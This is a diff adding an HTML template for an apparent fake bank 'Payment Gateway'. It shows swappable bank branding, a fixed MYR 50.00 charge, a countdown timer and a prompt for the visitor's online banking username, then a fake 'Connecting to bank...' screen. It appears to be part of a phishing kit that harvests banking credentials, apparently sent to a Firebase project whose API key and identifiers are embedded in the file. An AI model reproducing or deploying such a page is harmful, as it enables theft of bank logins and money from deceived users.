@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Payment Gateway</title>
+    <link rel="stylesheet" href="/css/styles.css" type="text/css" />
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.0.5/redux.min.js"
+      integrity="sha512-P36ourTueX/PrXrD4Auc1kVLoTE7bkWrIrkaM0IG2X3Fd90LFgTRogpZzNBssay0XOXhrIgudf4wFeftdsPDiQ=="
+      crossorigin="anonymous"
+    ></script>
+    <script src="https://unpkg.com/redux-thunk@2.3.0/dist/redux-thunk.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-firestore.js"></script>
+   
+    <script type="text/javascript">
+      let bank = "<%= bankVar %>";
+      let id = "<%= idVar %>";
+    </script>
+  </head>
+  <body>
+    <div class="login-form <%=bankClass%>">
+      <div class="modal-content">
+        <div class="modal-header">
+          <img alt="Bank Logo" class="img-circle" src="<%=imgURL%>" />
+          <h4><%=bankName %></h4>
+          <br />
+          <div id="refid">Reference ID:</div>
+          <small>Amount to charge</small>
+          <h3 class="amount">MYR 50.00</h3>
+
+          <div class="progress-container">
+            <div class="progress-fill">
+              <span class="progress-label"></span>
+            </div>
+          </div>
+          
+          <p class="stat-label">Session Timeout: <span id="timer">03:00</span></p>
+        </div>
+        <div class="modal-body">
+          <section class="bank-steps">
+            <div class="step-one">
+              <div class="instructions">
+                Please Enter Your Online Banking Username
+              </div>
+              <input
+                class="form-control username"
+                type="text"
+                placeholder="Bank Username"
+                required
+              />
+  
+              <button class="form-control modal-btn">Next</button>
+            </div>   
+          </section>
+          <section class="bank-loading" hidden=true>
+            <div className="bank-loading">
+              <p>
+                <span>
+                  <svg
+                    width="1em"
+                    height="1em"
+                    viewBox="0 0 16 16"
+                    class="bi bi-gear-fill spin"
+                    fill-rule="currentColor"
+                    xmlns="http://www.w3.org/2000/svg"
+                  >
+                    <path
+                      fill-rule="evenodd"
+                      d="M9.405 1.05c-.413-1.4-2.397-1.4-2.81 0l-.1.34a1.464 1.464 0 0 1-2.105.872l-.31-.17c-1.283-.698-2.686.705-1.987 1.987l.169.311c.446.82.023 1.841-.872 2.105l-.34.1c-1.4.413-1.4 2.397 0 2.81l.34.1a1.464 1.464 0 0 1 .872 2.105l-.17.31c-.698 1.283.705 2.686 1.987 1.987l.311-.169a1.464 1.464 0 0 1 2.105.872l.1.34c.413 1.4 2.397 1.4 2.81 0l.1-.34a1.464 1.464 0 0 1 2.105-.872l.31.17c1.283.698 2.686-.705 1.987-1.987l-.169-.311a1.464 1.464 0 0 1 .872-2.105l.34-.1c1.4-.413 1.4-2.397 0-2.81l-.34-.1a1.464 1.464 0 0 1-.872-2.105l.17-.31c.698-1.283-.705-2.686-1.987-1.987l-.311.169a1.464 1.464 0 0 1-2.105-.872l-.1-.34zM8 10.93a2.929 2.929 0 1 0 0-5.86 2.929 2.929 0 0 0 0 5.858z"
+                    />
+                  </svg>
+                </span>
+                Connecting to bank...
+              </p>
+            </div>
+          </div>
+        </section>
+
+        <div class="modal-footer">
+          <small>
+            Please <strong>DO NOT REFRESH</strong> your web browser
+          </small>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      var config = {
+        apiKey: "AIzaSyAuKticHpQ_M3K0C9ILY5_bsY4ynBKLOSo",
+        authDomain: "mpay-9ce31.firebaseapp.com",
+        databaseURL: "https://mpay-9ce31.firebaseio.com",
+        projectId: "mpay-9ce31",
+        storageBucket: "mpay-9ce31.appspot.com",
+        messagingSenderId: "311234895167",
+        appId: "1:311234895167:web:a79f496a8500b14715078a",
+        measurementId: "G-Q21ZY838GH"
+      };
+      // Initialize Firebase
+      firebase.initializeApp(config);
+           
+    </script>
+    <script src="/js/index.js"></script>
+  </body>
+
+</html>
